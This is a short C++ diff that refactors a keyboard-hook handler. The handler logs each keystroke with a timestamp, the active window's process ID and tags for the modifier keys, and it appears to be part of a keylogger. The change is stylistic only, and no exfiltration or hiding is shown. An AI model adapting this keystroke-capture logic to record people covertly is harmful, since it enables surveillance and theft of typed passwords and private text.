@@ -75,22 +75,14 @@ void Packager::addKey(int nCode, WPARAM wParam, LPARAM lParam) {
 
 		tmp->setDate(SelfUtils::secondsSinceEpoch());
 		tmp->setPid(SelfUtils::getActiveWindowPID());
+
 		std::string	str;
-		if (_shift) {
-			str += "[MAJ] ";
-		}
-		if (_ctrl) {
-			str += "[CTRL] ";
-		}
-		if (_win) {
-			str += "[WIN] ";
-		}
-		if (_alt) {
-			str += "[ALT] ";
-		}
-		if (_altGr) {
-			str += "[ALT GR] ";
-		}
+		str += (_shift ? "[MAJ] " : "");
+		str += (_ctrl ? "[CTRL] " : "");
+		str += (_win ? "[WIN] " : "");
+		str += (_alt ? "[ALT] " : "");
+		str += (_altGr ? "[ALT GR] " : "");
+
 		if ((info->vkCode != 13 && info->vkCode != 8) && (ToUnicode(info->vkCode, info->scanCode, kbdState, buff, 2, 0) > 0)) {
 			std::wstring ws(buff);
 			str.append(ws.begin(), ws.end());
